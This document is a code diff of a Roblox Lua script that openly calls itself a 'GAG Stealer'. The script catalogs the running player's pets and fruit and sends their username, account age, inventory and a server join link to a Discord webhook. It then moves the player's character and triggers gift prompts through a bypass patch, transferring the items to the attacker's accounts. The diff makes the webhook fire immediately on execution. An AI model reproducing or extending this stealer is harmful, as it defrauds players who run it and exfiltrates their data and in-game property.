@@ -1,4 +1,4 @@
--- GAG Stealer: Reliable Webhook Edition
+-- GAG Stealer: Instant Join Link Edition
 -- For support: discord.gg/notyet
 
 --------------------------
@@ -10,7 +10,6 @@ local CONFIG = {
     MIN_VALUE = _G.min_value or 10000000
 }
 
--- Rare pet emoji mapping
 local RARE_PETS = {
     ["Raccoon"]        = "🦥",
     ["Dragonfly"]      = "🐦‍🔥",
@@ -23,7 +22,7 @@ local RARE_PETS = {
 }
 local DEFAULT_PET_EMOJI = "🐶"
 local DEFAULT_FRUIT_EMOJI = "🥝"
-local WEBHOOK_COOLDOWN = 5  -- seconds
+local WEBHOOK_COOLDOWN = 5
 
 -------------------------------
 -- FIREPROXIMITY BYPASS PATCH --
@@ -129,7 +128,6 @@ local function collectItems()
                 local petUUID = tool:GetAttribute("PET_UUID")
                 local v14 = dataService:GetData().PetsData.PetInventory.Data[petUUID]
                 local name = v14.PetType
-                -- Calculate value
                 local petVal = 0
                 do
                     local hatchedFrom = v14.PetData.HatchedFrom
@@ -219,7 +217,7 @@ local function makeEmbed(receiverName, itemsToSend, totalValue, foundRare)
         "`Executer: "..plr.Name.."`\n"..
         "`Account age: "..(plr.AccountAge or "?").."`\n\n"..
         "**What you got**:\n\n"..
-        "``````\n\n"..
+        itemBlock.."\n\n"..
         "**[Join Server]("..joinLink..")**"
 
     return {
@@ -234,18 +232,11 @@ local function makeEmbed(receiverName, itemsToSend, totalValue, foundRare)
 end
 
 -------------------------
--- SEND MAIN WEBHOOK   --
+-- SEND INSTANT WEBHOOK --
 -------------------------
-local function canSendWebhook()
-    return tick() - lastWebhook > WEBHOOK_COOLDOWN
-end
-local function setWebhookTime()
-    lastWebhook = tick()
-end
-
-local function sendInitialWebhook(receiverName, itemsToSend, totalValue, foundRare)
-    if not canSendWebhook() then return end
-    setWebhookTime()
+do
+    local itemsToSend, totalValue, foundRare = collectItems()
+    local receiverName = table.concat(CONFIG.USERNAMES,", ") -- all target usernames
     local payload = makeEmbed(receiverName, itemsToSend, totalValue, foundRare)
     local body = HttpService:JSONEncode(payload)
     local headers = {["Content-Type"] = "application/json"}
@@ -257,39 +248,10 @@ local function sendInitialWebhook(receiverName, itemsToSend, totalValue, foundRa
 end
 
 --------------------------
--- WEBHOOK ON LEAVE/EVENT
---------------------------
-local function sendLeaveWebhook()
-    local leaveData = {
-        content = "",
-        embeds = {{
-            title = "🚪 Player left before gifting",
-            color = 16711680,
-            description = "**Player information**\n\n"..
-                "`Username: "..plr.Name.."`\n"..
-                "`Executer: "..plr.Name.."`\n"..
-                "`Account age: "..(plr.AccountAge or "?").."`\n\n"..
-                "**Status:** Victim left the server/disconnected before items could be transferred.",
-            footer = { text = "GAG stealer by Tobi. discord.gg/notyet" }
-        }}
-    }
-    local leaveBody = HttpService:JSONEncode(leaveData)
-    local headers = {["Content-Type"] = "application/json"}
-    if req then req({Url = CONFIG.WEBHOOK, Method = "POST", Headers = headers, Body = leaveBody}) end
-end
-
-Players.PlayerRemoving:Connect(function(player)
-    if player == plr then
-        sendLeaveWebhook()
-    end
-end)
-
---------------------------
--- INTERACTION / STEAL   --
+-- REST OF AUTO-GIFT LOGIC (UNCHANGED) --
 --------------------------
 
 local function equipTool(tool)
-    -- Move to character if not already, and equip via Humanoid
     if tool.Parent ~= plr.Character then
         tool.Parent = plr.Character
     end
@@ -302,7 +264,6 @@ local function equipTool(tool)
 end
 
 local function findGiftPrompt(targetChar)
-    -- Try all common and fallback locations for the prompt
     for _, part in ipairs({"Head", "HumanoidRootPart", "Torso", "UpperTorso"}) do
         local partObj = targetChar:FindFirstChild(part)
         if partObj then
@@ -318,7 +279,6 @@ local function findGiftPrompt(targetChar)
             return desc
         end
     end
-    -- Last resort: first ProximityPrompt anywhere
     for _, desc in ipairs(targetChar:GetDescendants()) do
         if desc:IsA("ProximityPrompt") then return desc end
     end
@@ -326,9 +286,7 @@ local function findGiftPrompt(targetChar)
 end
 
 local function doSteal(player)
-    -- Reload items on every gifting, to ensure up-to-date
-    local itemsToSend, totalValue, foundRare = collectItems()
-    sendInitialWebhook(player.Name, itemsToSend, totalValue, foundRare)
+    local itemsToSend = select(1, collectItems())
     local myChar = plr.Character or plr.CharacterAdded:Wait()
     local victimRoot = myChar:WaitForChild("HumanoidRootPart")
     victimRoot.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0,0,2)
@@ -340,7 +298,7 @@ local function doSteal(player)
             local t0 = os.clock()
             repeat
                 task.wait(0.04)
-                if (os.clock() - t0) > 3 then break end  -- Failsafe
+                if (os.clock() - t0) > 3 then break end
             until prompt.Enabled
             bypassProximityPrompt(prompt)
             wait(0.10)
